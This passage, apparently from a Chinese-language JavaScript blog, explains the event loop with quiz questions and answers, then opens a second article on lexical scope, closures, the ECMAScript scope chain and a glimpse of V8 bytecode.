thread。 重點是，當這些其他 thread 的事情做完以後，要怎麼樣重新丟回 main thread？因為只有 main thread 可以執行 JavaScript 嘛，所以一定要丟回去，不然沒辦法跑。 這就是 event loop 在做的事情了。 先來看一張經典的圖： （圖片來源：Understanding Event Loop, Call Stack, Event &amp; Job Queue in Javascript 裡面附的 codepen 截圖） 我們先來解釋右半部，假設我們執行了 setTimeout(fn, 2000) 這一行程式碼，會先把 setTimeout(fn, 2000) 丟到 call stack 去執行，然後 setTimeout 屬於 Web API，所以會跟瀏覽器說：「欸欸，幫我設定一個計時器，2000 毫秒以後呼叫 fn」，然後就執行結束，從 call stack 裡面 pop 掉。 當瀏覽器的計時器時間一到，就會把 fn 這個 function 丟進去 callback queue，為什麼這邊要有一個 queue 呢？因為可能會有很多 callback function 都在等待執行嘛，所以需要有一個排隊機制讓大家在這邊排隊，一個一個慢慢來，所以才叫做 callback queue，而不是 callback array 或是 callback stack。 接著就是重點 event loop 了，它扮演的角色很簡單，用白話文講就是： 不斷偵測 call stack 是否為空，如果是空的話就把 callback queue 裡面的東西丟到 call stack 以程式的角度去想，event loop 之所以叫做 loop，就是因為它可以表示成這樣： while(true) &#123; if (callStack.length === 0 &amp;&amp; callbackQueue.length > 0) &#123; // 拿出 callbackQueue 的第一個元素，並放到 callStack 去 callStack.push(callbackQueue.dequeue()) &#125; &#125; 就是這樣子而已，就是那麼簡單。 這就好像很多知名的博物館都有人數管制，你得先去買票，買票完以後去排隊。接著門口的警衛看到前面的人都已經到下一個景點了，才會把隊伍裡面的人放進來。 while(true) &#123; if (博物館入口沒有人 &amp;&amp; 排隊的隊伍有人) &#123; 放人進去博物館() &#125; &#125; 這邊只要掌握一個重點就好：「非同步的 callback function 會先被放到 callback queue，並且等到 call stack 為空時候才被 event loop 丟進去 call stack」 Event loop 就是那種只會出一張嘴不會做事的人，它不負責幫你執行 callback function，只會幫你把 function 丟到 call stack，真正在執行的還是 JavaScript 的 main thread。 理解 event loop 這個機制之後，就可以來解釋非同步的行為了，這邊影片裡面已經解釋得很清楚了，我就不再多講了，我只舉一個常見的範例： setTimeout(() => &#123; console.log('0ms') &#125;, 0) console.log('hello') 請問是 hello 會先被印出來，還是 0ms 會先被印出來，還是不一定？ 如果你的答案不是「hello 會先被印出來」，就代表其實沒有理解 event loop 這個機制，麻煩回去把影片重看一遍。 上面的範例中那個 callback function 會在 0ms 之後被放到 callback queue 去，但請注意，這時候 call stack 還不是空的，所以 console.log(&#39;hello&#39;) 會先被執行，執行完之後 call stack 清空，event loop 才把 callback 放到 call stack，然後才執行 callback 裡面的 console.log(&#39;0ms&#39;)。 所以輸出的順序保證會是 hello 先，再來才是 0ms。 最後做幾個小補充，第一個是 setTimeout 傳 0 只是代表「儘快執行」，不一定在 0ms 以後就會觸發，可能會是 4ms 或是更長，詳情可參考：MDN: Reasons for delays longer than specified 第二個補充是 event loop 其實還有一個小細節，那就是 callback queue 還區分成 macro task 跟 micro task 兩種，但這個有點小複雜，以後有機會再說。 第三個補充是雖然 Node.js 跟瀏覽器都有 event loop，但就像這兩個執行環境都有 setTimeout 一樣，背後的原理跟實作是不同的。大致上相同，但是細節不同。 第四個補充是上面提到的「只有 main thread 可以執行 JavaScript」其實不正確，因為在瀏覽器裡面有 Web Worker 可以用。 非同步小測驗在理解了非同步的原理 event loop 之後，照理來說你應該要對非同步的執行相當熟悉了，底下我會給出幾個題目，讓你驗證一下自己是否有真的理解： 1. 活動網站小明在一間專門辦活動的網站擔任前端工程師，被主管指派一個任務，那就是要加一段程式碼，呼叫後端 API 來取得「活動是否已經開始」，開始的話才前往活動頁，否則就不做任何事。 假設getAPIResponse是一個非同步的 function，會利用 ajax 去呼叫 API 之後取得結果，而/event這個 API 會回傳 JSON 格式的資料，其中started這個 boolean 的欄位代表著活動是否已經開始。 於是小明寫出以下程式碼： // 先設一個 flag 並且設為 false，表示活動沒開始 let isEventStarted = false // call API 並取得結果 getAPIResponse('/event', response => &#123; // 判斷活動是否開始並設置 flag if (response.started) &#123; isEventStarted = true &#125; &#125;) // 根據 flag 決定是否前往活動頁面 if (isEventStarted) &#123; goToEvent() &#125; 請問：這段程式碼有沒有問題？如果有的話，問題在哪裡？ 2. 慢慢等在完成了活動網頁之後，小明覺得自己對非同步好像還是沒有那麼熟悉，於是就想來做個練習，寫出了底下的程式碼： let gotResponse = false getAPIResponse('/check', () => &#123; gotResponse = true console.log('Received response!') &#125;) while(!gotResponse) &#123; console.log('Waiting...') &#125; 意思就是在 ajax 的 response 回來之前會不斷印出 waiting，直到接收到 response 才停止。 請問：以上寫法可以滿足小明的需求嗎？如果不行，請詳述原因。 3. 詭異的計時器小明被主管指派要去解一個 bug，在公司的程式碼裡面找到了這一段： setTimeout(() => &#123; alert('Welcome!') &#125;, 1000) // 後面還有其他程式碼，這邊先略過 這個 bug 是什麼呢？就是這個計時器明明指定說 1 秒之後要跳出訊息，可是執行這整段程式碼（注意，底下還有其他程式碼，只是上面先略過而已）以後，alert 卻在 2 秒以後才跳出來。 請問：這有可能發生嗎？無論你覺得可能或不可能，都請試著解釋原因。 4. 執行順序大考驗a(function() &#123; console.log('a') &#125;) console.log('hello') 請問：最後的輸出順序為何？是先 hello 再 a，還是先 a 再 hello，還是不一定？ 底下會針對每一題來做解答，強烈建議上面四題自己思考完以後再往下滑。 解答：1. 活動網站答案是有問題，這整段程式碼把同步與非同步混著寫，是最常見的錯誤。 要等 call stack 清空以後，event loop 才會把 callback 丟到 call stack，所以最後判斷 isEventStarted 的這一段程式碼會先被執行。當執行到這一段的時候，儘管 response 已經回來了，但 callback function 還在 callback queue 裡面待著，所以判斷isEventStarted的時候一定會是 false。 正確的方法是把判斷活動是否開啟的邏輯放在 callback 裡面，就可以確保拿到 response 以後才做判斷： // call API 並取得結果 getAPIResponse('/event', response => &#123; // 判斷活動是否開始並設置 flag if (response.started) &#123; goToEvent() &#125; &#125;) 解答：2. 慢慢等答案是不行。 還記得 event loop 的條件嗎？「當 call stack 為空，才把 callback 丟到 call stack」。 while(!gotResponse) &#123; console.log('Waiting...') &#125; 這一段程式碼會不斷執行，成為一個無窮迴圈。所以 call stack 永遠都有東西，一直被佔用，callback queue 裡面的東西根本丟不進 call stack。 因此小明原本的程式碼無論有沒有拿到 response，都只會一直印出 waiting。 解答：3. 詭異的計時器答案是有可能。 WebAPI 會在一秒之後把 callback 丟到 callback queue，那為什麼兩秒之後才會執行呢？因為這一秒 call stack 被佔用了。 只要 setTimeout 底下的程式碼做了很多事情並佔用了一秒鐘，callback 就會在一秒之後才被丟到 call stack 去，例如說： setTimeout(() => &#123; alert('Welcome!') &#125;, 1000) // 底下這段程式碼會在 call stack 佔用一秒鐘 const end = +new Date() + 1000 while(end > new Date())&#123; &#125; 所以 setTimeout 只能保證「至少」會在 1 秒後執行，但不能保證 1 秒的時候一定執行。 解答：4. 執行順序大考驗答案是不一定。 因為我沒有說a是同步還是非同步的，你不要看到 callback 就以為是非同步。 我的 a 可以這樣實作： function a(fn) &#123; fn() // 同步執行 fn &#125; a(function() &#123; console.log('a') &#125;) console.log('hello') 輸出就會是 a 然後 hello。 也可以這樣實作： function a(fn) &#123; setTimeout(fn, 0) // 非同步執行 fn &#125; a(function() &#123; console.log('a') &#125;) console.log('hello') 輸出就是 hello 然後才 a。 結語想要理解非同步的話必須一步一步來，不要想著一步登天。 這也是為什麼標題會叫做「先成為 callback 大師」，因為你得先對 callback 有一定的熟練程度之後才能進入下一個階段，這樣會容易很多。 這一篇主要是想幫大家建立起幾個重要的觀念： 什麼是阻塞？什麼是非阻塞？ 什麼是同步？什麼是非同步？ 同步與非同步的差別在哪裡？ 為什麼需要非同步？ callback 是什麼？ 為什麼需要 callback？ callback 的 error first 慣例 什麼是 event loop？它做了什麼？ 非同步常見的坑有哪些？ 若是能夠完全理解這篇，並且把文末的小測驗徹底搞懂，我相信你對非同步的理解應該就沒什麼問題了，實作上也能順利許多。在理解非同步基礎以及 callback 之後，下一篇將會講到使用 callback function 會碰到的問題以及解決方案：Promise，也會稍微提一下比較新的語法 async&#x2F;await。 （目前還沒有下集，有了之後我會補上） 參考資料： Overview of Blocking vs Non-Blocking 你懂 JavaScript 嗎？#23 Callback What the heck is the event loop anyway? | Philip Roberts | JSConf EU","link":"/2019/10/04/javascript-async-sync-and-callback/"},{"title":"所有的函式都是閉包：談 JS 中的作用域與 Closure ","text":"前言請先原諒我用了一個比較聳動的標題，因為實在是想不到還有什麼標題好下，最後選擇了一個可能比較有爭議的標題，但能利用這樣的標題激起討論也是滿有趣的，何況我說這話也是有根據的。 在觀看此篇文章之前請先看過上一篇：我知道你懂 hoisting，可是你了解到多深？，因為文章內容有部分相關，所以必須先有 Execution Context 以及 Variable Object 的觀念以後，才能夠吸收這篇文章的東西。 如果你只對文章標題的那句：「所有的函式都是閉包」有興趣，那可以直接往下拉，因為要講閉包就必須先從作用域開始講起，所以這篇文章按照慣例不會太短，前面也會有一定程度的鋪陳。 好，讓我們從作用域開始吧。 作用域（Scope）什麼是作用域（或也有人翻做：範疇）？ 我自己最喜歡的解釋是：「作用域就是一個變數的生存範圍，一旦出了這個範圍，就無法存取到這個變數」。 來看一個簡單的例子： function test()&#123; var a = 10 &#125; console.log(a) // Uncaught ReferenceError: a is not defined 在 ES6 以前，唯一產生作用域的方法就是 function，每一個 function 都有自己的作用域，在作用域外面你就存取不到這個 function 內部所定義的變數。然而 ES6 的時候引入了 let 跟 const，多了 block 的作用域，但那不是本文的重點所在，所以我就先這樣帶過了。 除了這種 function 的作用域以外，還有一種叫做作用域是 global 的，其實就是我們常在說的「全域」，或者是「全域變數」，任何地方都能夠存取到，如下範例： var I_am_global = 123 function test() &#123; console.log(I_am_global) // 123 &#125; test() 從上面的範例中你可以發現一件有趣的事情，那就是你在 function 裡面可以存取外面的變數，可是你從外面卻進不去 function 裡面，這邊我要引用之前看到的一個很有趣的解釋方法，這篇文章把作用域比喻成明星，把函式比喻成地區。 全域變數就是國際巨星，例如說湯姆克魯斯，無論到哪裡大家都認識這個人，因為實在是太紅了。而 function 裡面的變數就像是你那個很會唱歌的鄰居，整個社區都知道它的存在，但一但出了這個社區（超過了這個 function），就沒人認識他是誰。 所以 function 一層層的結構就像是地區那樣，最外層是地球、再來五大洲、亞洲、臺灣、台北市、大安區、大安森林公園，在大安森林公園運動的人知道那邊常在慢跑的朋友，也知道台北市內的名人，可是居住在台北市的人卻不一定知道大安區的區長是誰，因為那超出了它的範圍。 把上面的說法轉成程式碼就會變成這樣： function taiwan() &#123; var taiwan_star = 'taiwan_star' function taipei() &#123; function daan() &#123; var daan_star = 'daan_star' console.log(taiwan_star) // taiwan_star &#125; daan() console.log(daan_star) // Uncaught ReferenceError: daan_star is not defined &#125; taipei() &#125; taiwan() 所以你現在對作用域這個詞應該比較能夠理解了，就是一個變數的生存範圍，一但超過那個範圍就存取不到，而這個範圍就是 function 本身及其內部，所以你在 function 裡面宣告了一個變數，function 外是沒辦法存取的。 外面存取不到裡面的，但「內層」可以存取到「外層」的東西： function test() &#123; var a = 100 function inner() &#123; console.log(a) // 100 &#125; inner() &#125; test() 對於inner這個 function 來說，a並不是它自己的變數，而這種不在自己作用域中，也不是被當成參數傳進來的變數，就可以稱作 free variable，可以翻做自由變數（聽起來滿酷的）。 對 inner 來說，a 就是一個自由變數。 那 a 的值會是什麼？ 因為在 inner 這個作用域裡面找不到 a，就會去上一層 test 的作用域裡面尋找，如果還是找不到，就會再往上一層直到找到為止，所以你可以發現這樣會構成一個「作用域鏈」，inner function scope -&gt; test function scope -&gt; global scope，不斷在這條鏈往上找，如果最後還是找不到就拋出錯誤。 講到這邊基本的概念應該都有了，再來我要出一個問題把你的認知重新打亂並混淆你： var a = 100 function echo() &#123; console.log(a) // 100 or 200? &#125; function test() &#123; var a = 200 echo() &#125; test() 請問最後 log 出來的 a 應該會是 100 還是 200？ 我知道！是 100，因為全域變數裡面的 a 是 100…等等，可是我在 test 裡面的時候又宣告了一個叫 a 的變數並設為 200，echo 裡面的這個 a 好像也可能是 200…好混亂。 答案是 100，你只要掌握我們之前說的那些原則就行了，echo 裡面的那個 a 就是 global 的那個 a，跟 test 裡面的 a 一點關係都沒有。 但你會被混淆也是非常合理的事情，因為在某些程式語言裡面，a 的確會是 200 喔！a 最後出來的值（或換句話說，如何決定自由變數的值）跟程式語言如何決定「作用域」這件事情有關係。 其實我們一開始介紹的這種方法，叫做靜態作用域（static scope），為什麼叫做靜態？就代表作用域跟這個 function 在哪裡被「呼叫」一點關係都沒有，你用肉眼看程式碼的結構就可以看出來它的作用域是什麼，而且是不會變的。 舉例來說，上面那個範例印出來的 a 就會是 global 的 a，儘管我在 test 裡面宣告了另外一個 a 並且呼叫 echo 這個 function，但這跟作用域一點關係都沒有，靜態作用域是在 function 被「宣告」的時候就決定了，而不是 function 被「執行」的時候。 相對地，有靜態作用域就有動態作用域（dynamic scope），如果這個程式語言是採用動態作用域，那最後 log 出來的值就會是 200 而不是 100；換句話說，echo 這個 function 裡面的 a 的值是在程式執行時期才被動態決定的，你只看程式碼的結構沒辦法決定 a 到底是什麼值。 而 JavaScript 的作用域是採用前者，靜態作用域，所以你分析程式碼的結構就可以知道作用域的長相。這邊順帶一提的是 JavaScript 裡面最難解的問題之一：this，其實原理跟動態作用域有異曲同工之妙，那就是 this 的值也是程式執行時才被動態決定的，這也是為什麼一大堆人會搞不清楚它的值是什麼，因為會變來變去的。 靜態作用域其實更學術的名詞叫做 lexical scope，我有看過有人翻成語彙範疇，有人則是翻成詞法作用域。 要理解什麼是 lexical，你必須先知道一點 compiler 的運作原理。在編譯的時候有幾個步驟是用程式去 parse 你的程式碼並且解析，而其中一個步驟就叫做 Lexical Analysis（詞法分析或語彙分析），其實就是去正確分析出程式碼裡面的每一個詞。 我舉一個例子好了，例如說 a = 13 + 2這一個句子，經過詞法分析之後可能就會變成：a、=、13、+、2，這樣子的分組，就先理解到這邊就好，想知道更多編譯器的細節請自行參考相關書籍或文章，或等我有一天把這個基礎補足之後再來用白話文跟大家分享。 所以會叫做 lexical scope 的原因就是在編譯的時候其實就能決定作用域是什麼，才有了這樣子的一個名稱。 跟作用域相關的內容就到這裡了，幫大家複習幾個關鍵字： 作用域鏈 scope chain 自由變數 free variable 靜態作用域 static scope（lexical scope） 動態作用域 dynamic scope 閉包（Closure）再來終於要進入到閉包的相關內容了，在這之前我先介紹一下大家印象中的閉包大概是什麼樣子，然後又具備了什麼樣的特性。 請看以下範例程式碼： function test() &#123; var a = 10 function inner() &#123; console.log(a) // 10 &#125; inner() &#125; test() 沒什麼特別的，就只是執行一個內部的 function 而已。但如果我們現在不要直接執行 inner，而是把這個 function 回傳呢？ function test() &#123; var a = 10 function inner() &#123; console.log(a) // 還是 10 &#125; return inner &#125; var inner = test() inner() 神奇的事情發生了，那就是程式碼依舊輸出了 10。 神奇在哪裡？神奇在一個 function 執行完成以後本來會把所有相關的資源釋放掉，可是我 test 已經執行結束了，照理來說變數 a 的記憶體空間也被釋放，但我呼叫 inner 的時候居然還存取得到 a！ 換句話說，a 這個變數被「關在」inner 這個 function 裡面了，所以只要 inner 還存在的一天，a 就永無安寧，只能一直被關在裡面。 而事情的主因就是我在 function 裡面回傳了一個 function，才能造成這種明明執行完畢卻還有東西被關住的現象，而這種情形就是一般人所熟知的閉包，Closure。 那閉包的好處有什麼？優點之一就是能把變數隱藏在裡面讓外部存取不到，舉例來說我有個紀錄餘額的變數跟一個扣款的 function，但我有設置了一個上限，那就是最高只能扣 10 塊： var my_balance = 999 function deduct(n) &#123; my_balance -= (n > 10 ? 10 : n) // 超過 10 塊只扣 10 塊 &#125; deduct(13) // 只被扣 10 塊 my_balance -= 999 // 還是被扣了 999 塊 儘管我們寫了 deduct 這個 function 來操作，但變數還是暴露在外部，任何人都可以直接來改這個變數。這時如果我們利用閉包來改寫，世界就不一樣了： function getWallet() &#123; var my_balance = 999 return &#123; deduct: function(n) &#123; my_balance -= (n > 10 ? 10 : n) // 超過 10 塊只扣 10 塊 &#125; &#125; &#125; var wallet = getWallet() wallet.deduct(13) // 只被扣 10 塊 my_balance -= 999 // Uncaught ReferenceError: my_balance is not defined 因為我把餘額這個變數給藏在 function 裡面，所以外部是存取不到的，你想要修改只能夠利用我暴露出去的 deduct 這個函式，這樣子就達到了隱藏資訊的目的，確保這個變數不會隨意地被改到。 但比起這個閉包的用法，我相信有很多人應該都是從底下這個慘痛的經驗才知道有閉包這個東西： var btn = document.querySelectorAll('button') for(var i=0; i&lt;=4; i++) &#123; btn[i].addEventListener('click', function() &#123; alert(i) &#125;) &#125; 假設頁面上有五個按鈕，我想要第一個按下去時彈出 0，第二個按下去時彈出 1，以此類推，於是寫了上面的程式碼，看起來十分合理。 誰知道我一點下去按鈕，靠腰勒為什麼每一個按鈕都彈出 5，都彈出一樣的數字就夠詭異了，5 到底是從哪來的啊？ 包括我自己也是有類似的經驗才意識到自己對作用域以及閉包不太熟悉，現在有了經驗之後再回頭來看上面這段程式碼就能夠完全理解了。 首先，上面的迴圈你以為是這樣子： btn[0].addEventListener('click', function() &#123; alert(0) &#125;) btn[1].addEventListener('click', function() &#123; alert(1) &#125;) ... 但其實是這樣子： btn[0].addEventListener('click', function() &#123; alert(i) &#125;) btn[1].addEventListener('click', function() &#123; alert(i) &#125;) ... 仔細想想你會發現下面比較合理，我本來就是幫它加一個 function 是按下去的時候會跳出 i 而已，我又沒有直接執行這個 function。 所以當使用者按按鈕的時候，畫面就會跳出 i，那這個 i 的值會是什麼？因為你按按鈕的時候迴圈已經跑完了，所以 i 早已變成 5（迴圈的最後一圈，i 加一變成 5，判斷不符合 i&lt;&#x3D;4 這個條件所以跳出迴圈），畫面也就跳出數字 5 了。 我加上的這幾個 function，本身都沒有 i 這個變數，所以往作用域的外層去尋找，就找到上面迴圈的那個變數 i 了，因此這幾個 function 所指涉到的 i 是同一個 i。 那應該怎麼解決這個問題呢？加上 function！ function getAlert(num) &#123; return function() &#123; alert(num) &#125; &#125; for(var i=0; i&lt;=4; i++) &#123; btn[i].addEventListener('click', getAlert(i)) &#125; 這邊要注意的是 getAlert(i) 會「回傳」一個跳出 i 的 function，因此我額外產生了五個新的 function，每一個 function 裡面都有自己該跳出的值。 或是你要耍帥的話就這樣寫： for(var i=0; i&lt;=4; i++) &#123; (function(num) &#123; btn[i].addEventListener('click', function() &#123; alert(num) &#125;) &#125;)(i) &#125; 利用 IIFE（Immediately Invoked Function Expression）把一個 function 包起來並傳入 i 立即執行，所以迴圈每跑一圈其實就會立刻呼叫一個新的 function，因此就產生了新的作用域。 以上如果你都覺得太麻煩不想用，恭喜，在 ES6 裡面有了 block scope 以後，你只要簡單地把迴圈裡面用的 var 改成 let 就行了： for(let i=0; i&lt;=4; i++) &#123; btn[i].addEventListener('click', function() &#123; alert(i) &#125;) &#125; 因為 let 的特性，所以其實迴圈每跑一圈都會產生一個新的作用域，因此 alert 出來的值就會是你想要的那個值。如果你還是覺得有點疑惑，你可以把迴圈看成這樣： &#123; // 塊級作用域 let i=0 btn[i].addEventListener('click', function() &#123; alert(i) &#125;) &#125; &#123; // 塊級作用域 let i=1 btn[i].addEventListener('click', function() &#123; alert(i) &#125;) &#125; ... 說到這邊我們對閉包有了初步的理解，但對於「什麼是閉包」這個問題似乎還沒有一個明確的定義，「閉包就是可以把值關在裡面的 function」聽起來怪怪的，如果你去找維基百科，他會跟你說： 在電腦科學中，閉包（英語：Closure），又稱詞法閉包（Lexical Closure）或函式閉包（function closures），是參照了自由變數的函式。這個被參照的自由變數將和這個函式一同存在，即使已經離開了創造它的環境也不例外。所以，有另一種說法認為閉包是由函式和與其相關的參照環境組合而成的實體。 如果去找英文的維基百科，可以看到它寫著： Operationally, a closure is a record storing a function together with an environment 好，看起來還是有點霧煞煞，但總之對於閉包的定義先在此打住，大家心中有個模糊的概念就好，我們晚點再回來處理。 在這個段落我們知道了閉包可以實際應用在哪裡，也理解了閉包可以存取到應該被釋放的值（但卻因為閉包的存在無法被釋放），再來我們來看看 ECMAScript 是如何講述作用域的。 ECMAScript 中的作用域在開始之前，如果你忘記我們之前講的運作模型，請回去我知道你懂 hoisting，可是你了解到多深？複習一下，因為我們等等會用到。 在這邊我一樣用篇幅較少的 ES3 來當範例，要注意的是 ES6 以後很多名詞變得不一樣了，但原理大致上是相通的。 上次我們在10.1.3 Variable Instantiation的章節看到了 hoisting 相關的東西，這次我們要看的則是下一個段落而已，也就是10.1.4 Scope Chain and Identifier Resolution。 Every execution context has associated with it a scope chain. A scope chain is a list of objects that are searched when evaluating an Identifier. When control enters an execution context, a scope chain is created and populated with an initial set of objects, depending on the type of code. 每個 EC 都有自己的 scope chain，當進入 EC 的時候 scope chain 會被建立。 接著我們來看10.2 Entering An Execution Context底下的10.2.3 Function Code： The scope chain is initialised to contain the activation object followed by the objects in the scope chain stored in the [[Scope]] property of the Function object. 這一段描述了 scope chain 的內容到底是什麼，它講說當進入 EC 的時候，scope chain 會被初始化為 activation object 並加上 function 的[[Scope]]這個屬性。 以上段落其實要講的事情只有一個，就是在進入 EC 的時候會做下面這件事： scope chain = activation object + [[Scope]] 接著要處理的是兩個問題：什麼是 activation object（以下簡稱 AO），什麼又是[[Scope]]？ 在10.1.6 Activation Object可以找到 AO 的解釋： When control enters an execution context for function code, an object called the activation object is created and associated with the execution context. The activation object is initialised with a property with name arguments and attributes { DontDelete } The activation object is then used as the variable object for the purposes of variable instantiation. 這邊提到When control enters an execution context for function code，意思就是只有在進入「函式」的時候會產生這個 AO，而之後 AO 便被當作 VO 拿去使用。 所以什麼是 AO？你可以把它直接當作 VO 的另外一種特別的型態，只在 function 的 EC 中出現，所以在 global 的時候我們有 VO，在 function 內的時候我們有 AO，但是做的事情都是一樣的，那就是會把一些相關的資訊放在裡面。 差別在哪裡？差別在於 AO 裡面會有一個arguments，畢竟是給 function 用的嘛，一定要存這個，其餘地方都是差不多的。如果你偷懶把 VO 跟 AO 這兩個詞混在一起使用，我覺得也是可以接受的，因為差別真的太細微了。 解決了 AO 的問題之後，那什麼是[[Scope]]？在13.2 Creating Function Objects的部分可以看到更詳細的解釋： Given an optional parameter list specified by FormalParameterList, a body specified by FunctionBody, and a scope chain specified by Scope, a Function object is constructed as follows （中間省略） 7.Set the [[Scope]] property of F to a new scope chain (10.1.4) that contains the same objects as Scope. 就是說你在建立 function 的時候會給一個 Scope，而這一個 Scope 會被設定到[[Scope]]去。 那在建立 function 時給的 Scope 是什麼？還能有什麼，當然就是當前 EC 的 Scope。 這樣一段段看完之後其實我們可以整理出這樣的一個流程： 當 function A 建立時，設置A.[[Scope]] = scope chain of current EC 當進入一個 function A 時，產生一個新的 EC，並設置EC.scope_chain = AO + A.[[Scope]] 想要完全搞清楚，就讓我們實際再來跑一遍這整個流程就行了，我們用下面這個非常簡單的程式碼作為範例： var v1 = 10 function test() &#123; var vTest = 20 function inner() &#123; console.log(v1, vTest) //10 20 &#125; return inner &#125; var inner = test() inner() 第一步：進入 Global EC現在進入 Global EC 並且初始化 VO 以及 scope chain，前面有講過scope chain = activation object + [[Scope]]，但因為這不是一個 function 所以沒有[[Scope]]，而沒有 AO 就直接拿 VO 來用。總之，最後 Global EC 會是這樣： globalEC = &#123; VO: &#123; v1: undefined, inner: undefined, test: function &#125;, scopeChain: globalEC.VO &#125; VO 的部分就按照之前講過的初始化，現在唯一多的步驟是多出了 scopeChain 這個屬性，而按照定義，scope chain 就是 globalEC 自己的 VO&#x2F;AO。 這邊別忘了還有最後一步，那就是要設置 function 的[[Scope]]，所以 test 這個 function 的[[Scope]]就會是globalEC.scopeChain也就是globalEC.VO。 第二步：執行程式碼再來第二步執行程式碼，跑了var v1 = 10之後碰到var inner = test()，這邊要準備進入到 test 的 EC 了，在進入前我們現在的資訊長這樣： globalEC = &#123; VO: &#123; v1: 10, inner: undefined, test: function &#125;, scopeChain: globalEC.VO &#125; test.[[Scope]] = globalEC.scopeChain 第三步：進入 test EC按照慣例，進入的時候先把 test EC 跟 AO 建立起來，然後記得scope chain = activation object + [[Scope]] testEC = &#123; AO: &#123; arguments, vTest: undefined, inner: function &#125;, scopeChain: [testEC.AO, test.[[Scope]]] = [testEC.AO, globalEC.scopeChain] = [testEC.AO, globalEC.VO] &#125; globalEC = &#123; VO: &#123; v1: 10, inner: undefined, test: function &#125;, scopeChain: globalEC.VO &#125; test.[[Scope]] = globalEC.scopeChain 可以看到的是 testEC 的 scope chain 就是自己的 AO 加上之前設置過的[[Scope]]，然後說穿了，其實 scope chain 就是上層的 EC 的 VO 嘛！只是我們用了比較複雜的程序去設置這件事情，但本質上其實就是 VO&#x2F;AO 的組合。 最後別忘記設置 inner 的 scope，inner.[[Scope]] = testEC.scopeChain。 第四步：執行 test 中的程式碼其實也就只跑了var vTest = 20跟return inner，執行完以後變成這樣： testEC = &#123; AO: &#123; arguments, vTest: 20, inner: function &#125;, scopeChain: [testEC.AO, globalEC.VO] &#125; globalEC = &#123; VO: &#123; v1: 10, inner: function, test: function &#125;, scopeChain: globalEC.VO &#125; inner.[[Scope]] = testEC.scopeChain = [testEC.AO, globalEC.VO] 接著把 inner 回傳回去，而test這個 function 就結束了，照理來說資源應該要被釋放才對。 可是！你有沒有發現現在inner.[[Scope]]記著testEC.AO？因為有人還需要它，所以它沒辦法就這樣被釋放，僅管 test 結束了，testEC.AO 還是存在於記憶體裡面。 第五步：進入 inner EC這邊就不贅述了，就按照同樣的原則去做初始化： innerEC = &#123; AO: &#123; arguments &#125;, scopeChain: [innerEC.AO, inner.[[Scope]]] = [innerEC.AO, testEC.scopeChain] = [innerEC.AO, testEC.AO, globalEC.VO] &#125; testEC = &#123; AO: &#123; arguments, vTest: 20, inner: function &#125;, scopeChain: [testEC.AO, globalEC.VO] &#125; globalEC = &#123; VO: &#123; v1: 10, inner: function, test: function &#125;, scopeChain: globalEC.VO &#125; inner.[[Scope]] = testEC.scopeChain = [testEC.AO, globalEC.VO] 有沒有發現就跟我剛才講的一樣，其實 scope chain 說穿了就是 VO&#x2F;AO 的組合而已。 第六步：執行 inner從 scope chain 裡面尋找 v1 跟 vTest 這兩個變數，在自己的 AO 裡面找不到所以往上找，找到 testEC.AO 並尋獲 vTest，但 v1 還是沒找到所以又往上一層去看 globalEC.VO，最後找到 v1，成功獲得這兩個變數的值並印出。 結束。 上面的流程講得較為詳細，可以自己再開個小視窗在旁邊搭配著程式碼一起看，一步步來看相信會比較容易理解。其實在上次討論 hoisting 的時候就已經講過這個模型了，而今天只是補充上次沒講到的部分，那就是 scope chain，加上去之後這個模型就完整許多，不但能解釋 hoisting，也能解釋為什麼 function 執行結束以後還可以存取的到那些變數。 因為那些變數被留在 innerEC 的 scope chain 裡面，所以不會也不能被 GC 回收掉，才會發生這種現象。 而理解了 scope chain 其實只是 VO&#x2F;AO 的組合以後，也能很輕易地就知道我們開頭所說的「在 scope chain 往上找」是什麼意思，就是往上一層去看有沒有這個變數嘛，因為有的話一定會存在 VO&#x2F;AO 裡面。 最後，上面這個模型還有一件事情要注意，那就是無論我有沒有把內部的 function 給回傳（以上面這個例子就是 inner），都不影響這個機制的運行。 意思是說儘管我的程式碼長這樣： var v1 = 10 function test() &#123; var vTest = 20 function inner() &#123; console.log(v1, vTest) //10 20 &#125; inner() // 不回傳直接執行 &#125; test() 他最後出來的模型跟剛剛的程式碼是一模一樣的，inner 都有一樣的 scope chain，並且一樣存著 test 跟 global EC 的 VO&#x2F;AO。 你有注意到我們正一步步邁向我們的標題嗎？ 所有的函式都是閉包我們再回來看 wiki 上面對閉包的定義： 在電腦科學中，閉包（英語：Closure），又稱詞法閉包（Lexical Closure）或函式閉包（function closures），是參照了自由變數的函式。這個被參照的自由變數將和這個函式一同存在，即使已經離開了創造它的環境也不例外。所以，有另一種說法認為閉包是由函式和與其相關的參照環境組合而成的實體。 如果說你認為閉包一定要：「離開創造它的環境」，那顯然「所有的函式都是閉包」這句話就不成立；但如果你認同閉包的定義是：「由函式和與其相關的參照環境組合而成的實體」，那就代表在 JavaScript 裡面，所有的函式都是閉包。 為什麼？因為這就是 JavaScript 的運行機制，你每個宣告的 function 都會儲存著[[Scope]]，而這個資訊裡面就是參照的環境。 而這個說法也不是我自創的，在解釋 ECMAScript 最經典的系列文章中的其中一篇：ECMA-262-3 in detail. Chapter 6. Closures.，裡面是這樣說的： Let’s make a note again, that all functions, independently from their type: anonymous, named, function expression or function declaration, because of the scope chain mechanism, are closures. from the theoretical viewpoint: all functions, since all they save at creation variables of a parent context. Even a simple global function, referencing a global variable refers a free variable and therefore, the general scope chain mechanism is used; 所以從理論上來說，JavaScript 裡面的所有 function 都是閉包。 from the practical viewpoint: those functions are interesting which: continue to exist after their parent context is finished, e.g. inner functions returned from a parent function; use free variables. 但如果你只從「實作」上的觀點來關心閉包的話，我們會說閉包必須要用到自由變數，也必須在離開了建立的 context 以後還能夠存在，這樣才是我們真正所關心的那個閉包。 所以閉包到底是什麼，端看你從哪個角度去看他，但無庸置疑的，從理論上的角度來看 JavaScript 裡所有的 function 都是閉包，如果你還是不信的話，那最後我帶你來看看 V8 是怎麼想的。 再探 V8我們一樣寫一段簡單的程式碼，看看最後會 compile 出什麼東西： var a = 23 function yoyoyo()&#123; &#125; yoyoyo() 這邊放一個 23 是因為方便我們在 byte code 中定位到這段程式，只有 function 會有名稱可以識別，這種寫在 global 裡面的東西比較難找。 產生出的結果是這樣： [generating bytecode for function: ] Parameter count 6 Frame size 16 0x3e0ed5f6a9da @ 0 : 6e 00 00 02 CreateClosure [0], [0], #2 0x3e0ed5f6a9de @ 4 : 1e fa Star r1 10 E&gt; 0x3e0ed5f6a9e0 @ 6 : 91 StackCheck 70 S&gt; 0x3e0ed5f6a9e1 @ 7 : 03 17 LdaSmi [23] 